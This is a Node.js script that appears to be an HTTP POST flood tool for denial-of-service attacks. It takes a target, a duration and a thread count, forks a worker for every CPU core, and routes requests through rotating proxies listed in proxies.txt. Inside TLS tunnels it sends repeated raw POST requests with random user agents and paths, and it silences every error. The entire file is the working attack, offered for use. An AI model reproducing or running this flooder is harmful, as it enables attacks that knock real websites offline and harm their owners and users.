const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var colors = require('colors');
var theJar = request_2.jar();
const path = require("path");
const { cpus } = require('os');
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;
const cluster = require('cluster');

//Coming soon...
var cookies = {};

var VarsDefinetions = {
Objetive: process.argv[2],
time: process.argv[3],
rate:process.argv[4]
}

if (process.argv.length !== 5) {
    console.log(`                       
Usage: node ${path.basename(__filename)} <Target> <Time> <Threads>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <30>
------------------------------------------------------------------
Dependencies: user-agents.txt (User Agents) | proxies.txt (Proxies)
`);
    process.exit(0);
}

var fileName = __filename;
var file = path.basename(fileName);

var proxies = fs.readFileSync('proxies.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
var UAs = fs.readFileSync('user-agents.txt', 'utf-8').replace(/\r/g, '').split('\n');

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}
function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
var parsed = url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);
let browser_saves = '';

const numCPUs = cpus().length;
if (cluster.isPrimary) {

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
  });
} else {

function BuildRequest() {
let path = parsed.path;
if (path.indexOf("[rand]") !== -1){
    path = path.replace(/\[rand\]/g,RandomString(getRandomNumberBetween(5,16)));
}
var raw_socket = 'POST' + ' ' + path + ' HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nCache-Control: max-age=0\r\nAccept-Language: en-us\r\nHost: ' + parsed.host + VarsDefinetions.Objetive + '\r\nContent-Length: 0\r\nConnection: keep-alive\r\nUser-Agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nReferer: ' + VarsDefinetions.Objetive + '\r\n\r\n'
return raw_socket;
}

setInterval(function() {

var getrandprxy = getRandomNumberBetween(100, proxies.length-1000);

var proxy = proxies[Math.floor(Math.random() * getrandprxy)];
proxy = proxy.split(':');

const agent = new http.Agent({
keepAlive: true,
keepAliveMsecs: 50000,
maxSockets: Infinity,
});

var tlsSessionStore = {};

var req = http.request({
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
      headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'keep-alive',
    'Connection': 'keep-alive',
  },
    method: 'CONNECT',
    path: parsed.host+':443'
}, function(){ 
    req.setSocketKeepAlive(true);
 });

req.on('connect', function (res, socket, head) {
    tls.authorized = true;
    tls.sync = true;
    var TlsConnection = tls.connect({
        ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        secureProtocol: ['TLSv1_2_method','TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
        honorCipherOrder: true,
        requestCert: true,
        host: parsed.host,
        port: 80,
        secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
        /*                      |                           |
                                SSL_OP_NO_TLSv1/SSL_OP_NO_DTLSv1                Disable TLSv1/DTLSv1. 
                                SSL_OP_NO_TLSv1_2/SSL_OP_NO_DTLSv1_2            Disable TLSv1.2/DTLSv1.2
                                SSL_OP_NO_TLSv1_1   Disable TLSv1.1
                                SSL_OP_NETSCAPE_CA_DN_BUG
                                SSL_OP_NO_TLSv1_3
        */
        servername: parsed.host,
        secure: true,
        rejectUnauthorized: false,
        socket: socket
    }, function () {

for (let j = 0; j < VarsDefinetions.rate; j++) {

TlsConnection.setKeepAlive(true, 10000)
TlsConnection.setTimeout(10000);
var r = BuildRequest();
TlsConnection.write(r);
}
});

TlsConnection.on('disconnected', () => {
    TlsConnection.destroy();
});

TlsConnection.on('timeout' , () => {
    TlsConnection.destroy();
});

TlsConnection.on('error', (err) =>{
    TlsConnection.destroy();
});

TlsConnection.on('data', (chunk) => {
    setTimeout(function () { 
        TlsConnection.abort(); 
        return delete TlsConnection
    }, 10000); 
});

TlsConnection.on('end', () => {
  TlsConnection.abort();
  TlsConnection.destroy();
});

}).end()
}, 0);
}

setTimeout(() => {
    console.log('\nHTTP POST flood sent for ' + process.argv[3] + ' seconds with ' + process.argv[4] + ' threads! Target: ' + process.argv[2] + '\n')
  process.exit(1);
}, VarsDefinetions.time*1000)
